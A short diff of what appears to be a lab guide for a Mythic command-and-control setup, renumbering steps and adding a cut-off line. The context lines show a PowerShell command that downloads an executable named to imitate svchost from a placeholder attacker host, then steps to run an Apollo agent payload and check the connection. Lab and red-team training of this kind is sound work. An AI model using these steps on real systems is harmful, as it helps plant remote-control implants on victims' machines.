@@ -155,12 +155,12 @@ Disable Windows Defender:
     
     `Invoke-WebRequest -Uri http://<MYDFIR-MYTHIC-IP>:9999/svchost-emaan.exe -OutFile "C:\Users\Public\Downloads\svchost-emaan.exe"`
     
-    
-4. **Execute Payload**
+    - Navigat
+3. **Execute Payload**
     
     `.\apollo.exe`
     
-5. **Verify Connection**
+4. **Verify Connection**
     
     `netstat -anob`
     
